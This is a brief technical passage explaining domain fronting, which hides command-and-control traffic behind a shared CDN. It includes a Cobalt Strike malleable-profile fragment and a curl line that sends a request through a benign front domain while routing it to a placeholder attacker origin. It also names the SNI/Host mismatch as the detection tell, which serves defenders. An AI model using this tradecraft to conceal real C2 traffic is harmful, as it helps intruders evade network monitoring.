Front the C2 behind a shared CDN: the TLS SNI (and DNS) name a high-reputation edge
domain the CDN serves, so egress filtering and reputation see benign traffic, while
the inner HTTP `Host:` header routes the request to the attacker's origin on that
same CDN. Defenders watching the SNI never see the real destination. The tell is the
mismatch itself — the encrypted Host disagreeing with the SNI — plus the CDN edge
being contacted by a non-browser process.

```sh
# Cobalt Strike malleable profile: front on a benign CDN domain, route via Host
#   set host_stage "false";
#   http-get { set uri "/api/v1/collect"; client { header "Host" "<attacker-origin.cdn>"; } }
# curl illustration of the fronting shape (SNI != Host):
curl -s -H "Host: <attacker-origin.cdn>" https://<benign-front.cdn>/api/v1/collect
```
